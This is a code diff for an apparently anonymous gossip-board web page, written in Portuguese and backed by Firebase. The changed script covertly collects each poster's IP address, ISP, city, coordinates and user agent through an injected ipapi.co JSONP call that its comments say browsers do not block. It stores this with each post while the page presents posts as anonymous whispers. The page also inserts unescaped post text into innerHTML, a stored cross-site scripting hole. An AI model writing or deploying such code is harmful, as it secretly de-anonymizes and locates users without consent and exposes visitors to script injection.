@@ -19,8 +19,9 @@
         .input-box { background: #111; padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
         textarea { width: 100%; background: transparent; border: none; color: #aaa; font-size: 1.1rem; outline: none; font-family: inherit; resize: none; }
         .btn-post { background: #222; color: #999; border: 1px solid #444; padding: 10px 20px; float: right; cursor: pointer; }
-        .btn-post:disabled { opacity: 0.5; cursor: not-allowed; }
-        .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; }
+        .btn-post:disabled { opacity: 0.5; cursor: wait; }
+        .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
@@ -64,7 +65,6 @@
             carregarFofocas();
         }
 
-        // SOLUÇÃO PARA O ERRO: Coleta via Script (JSONP) para evitar bloqueio do navegador
         function enviarFofoca() {
             var inputElement = document.getElementById('fofocaInput');
             var btn = document.getElementById('btnEnviar');
@@ -75,37 +75,67 @@
             btn.disabled = true;
             btn.innerText = "Rastreando...";
 
-            // Criamos uma função temporária para receber os dados
-            window.finalizarEnvio = function(data) {
-                var rastro = {
-                    ip: data.ip || "Não capturado",
-                    localizacao: (data.city || "?") + ", " + (data.region || "?") + " - " + (data.country_name || "?"),
-                    provedor_wifi: data.org || "Não identificado",
-                    latitude: data.latitude || 0,
-                    longitude: data.longitude || 0,
-                    e_vpn: data.security ? data.security.is_vpn : false
-                };
+            let enviado = false;
 
-                db.collection("fofocas").add({
-                    conteudo: texto,
-                    data: firebase.firestore.FieldValue.serverTimestamp(),
-                    dispositivo: navigator.userAgent,
-                    rastro: rastro
-                }).then(function() {
-                    inputElement.value = "";
-                    alert("Enviado com rastro real!");
-                }).finally(function() {
-                    btn.disabled = false;
-                    btn.innerText = "Soltar o Verbo!";
-                    delete window.finalizarEnvio;
-                    if (script.parentNode) document.body.removeChild(script);
-                });
+            // Segurança: Se em 3.5 segundos a API não responder, envia assim mesmo
+            const timeoutSeguranca = setTimeout(() => {
+                if (!enviado) {
+                    enviado = true;
+                    salvarNoFirebase(texto, { status: "Rastreio lento/bloqueado" });
+                }
+            }, 3500);
+
+            // Tenta capturar rastro via JSONP (Mais difícil de bloquear)
+            window.processarRastro = function(data) {
+                if (!enviado) {
+                    enviado = true;
+                    clearTimeout(timeoutSeguranca);
+                    
+                    const rastro = {
+                        ip: data.ip || "Oculto",
+                        provedor_wifi: data.org || "Não identificado",
+                        localizacao: (data.city || "?") + ", " + (data.region || "?"),
+                        latitude: data.latitude || 0,
+                        longitude: data.longitude || 0,
+                        dispositivo: navigator.userAgent
+                    };
+                    salvarNoFirebase(texto, rastro);
+                }
             };
 
-            // Injeta o script de rastreio que o navegador não bloqueia
-            var script = document.createElement('script');
-            script.src = 'https://ipapi.co/jsonp/callback=finalizarEnvio';
+            const script = document.createElement('script');
+            script.src = 'https://ipapi.co/jsonp/callback=processarRastro';
+            script.onerror = () => {
+                if (!enviado) {
+                    enviado = true;
+                    clearTimeout(timeoutSeguranca);
+                    salvarNoFirebase(texto, { status: "Erro na API de rastro" });
+                }
+            };
             document.body.appendChild(script);
+        }
+
+        function salvarNoFirebase(texto, rastro) {
+            const btn = document.getElementById('btnEnviar');
+            const inputElement = document.getElementById('fofocaInput');
+
+            db.collection("fofocas").add({
+                conteudo: texto,
+                data: firebase.firestore.FieldValue.serverTimestamp(),
+                rastro: rastro
+            }).then(() => {
+                inputElement.value = "";
+                alert("Fofoca enviada!");
+            }).catch((e) => {
+                console.error(e);
+                alert("Erro ao conectar com Firebase.");
+            }).finally(() => {
+                btn.disabled = false;
+                btn.innerText = "Soltar o Verbo!";
+                // Limpa scripts injetados
+                const scripts = document.querySelectorAll('script[src*="ipapi"]');
+                scripts.forEach(s => s.remove());
+            });
         }
 
         function carregarFofocas() {
@@ -114,7 +144,10 @@
                 mural.innerHTML = "";
                 snapshot.forEach(function(doc) {
                     var f = doc.data();
-                    mural.innerHTML += '<div class="fofoca-card"><small>📢 Alguém sussurrou...</small><p>' + f.conteudo + '</p></div>';
+                    var div = document.createElement('div');
+                    div.className = 'fofoca-card';
+                    div.innerHTML = '<small style="color: #555;">📢 Alguém sussurrou...</small><p>' + f.conteudo + '</p>';
+                    mural.appendChild(div);
                 });
             });
         }
